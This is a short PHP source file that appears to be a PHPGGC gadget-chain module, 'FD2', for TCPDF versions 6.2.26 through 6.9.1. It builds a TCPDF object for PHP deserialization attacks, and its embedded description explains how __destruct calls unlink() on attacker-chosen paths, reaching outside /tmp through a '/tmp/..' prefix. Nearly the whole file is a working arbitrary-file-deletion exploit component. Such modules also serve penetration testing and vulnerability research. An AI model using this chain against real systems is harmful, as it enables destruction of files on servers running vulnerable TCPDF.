<?php

namespace GadgetChain\TCPDF;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '6.2.26 <= 6.9.1';
    public static $vector = '__destruct';
    public static $author = 'Aleksey Solovev, Nikita Sveshnikov (Positive Technologies)';
    public static $information = '
        TCPDF contains the properties $file_id and $image keys. The imagekeys property expects an array of strings, each representing an absolute file path. The $file_id property can be set to any value. Upon __destruct, unlink() is called on each entry in the imagekeys array, provided PHP has permission to delete the files.

        Although absolute paths are expected, each entry is internally prefixed with /tmp/.., allowing access to arbitrary locations outside the /tmp directory.
    ';

    public function generate(array $parameters)
    {
        return new \TCPDF($parameters['remote_path']);
    }
}
